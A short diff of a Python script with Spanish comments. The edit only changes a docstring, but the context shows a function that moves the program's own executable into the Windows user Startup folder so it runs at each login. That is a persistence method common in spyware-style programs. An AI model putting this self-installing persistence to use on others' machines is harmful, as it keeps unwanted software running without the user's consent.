@@ -15,7 +15,7 @@ import sys
 nombre_exe = re.search(r'(\w+\.pyw?)|(\w+\.exe)',sys.argv[0]).group() # nombre que tendra el ejecutable, debe coincidir o la operacion mover_dir() falla
 
 def mover_dir(): # mover ejecutable al startup
-    'intenta mover el ejecutable a la ruta de startup de windows, si falla imprime el error en consola y el codigo continua'
+    'intenta mover el ejecutable a la ruta de startup de windows, si falla imprime el error en consola (si esta habilitada) y el codigo continua'
     try:
         os.rename(f'{os.getcwd()}\\{nombre_exe}',f'{os.environ.get('USERPROFILE')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{nombre_exe}')
 
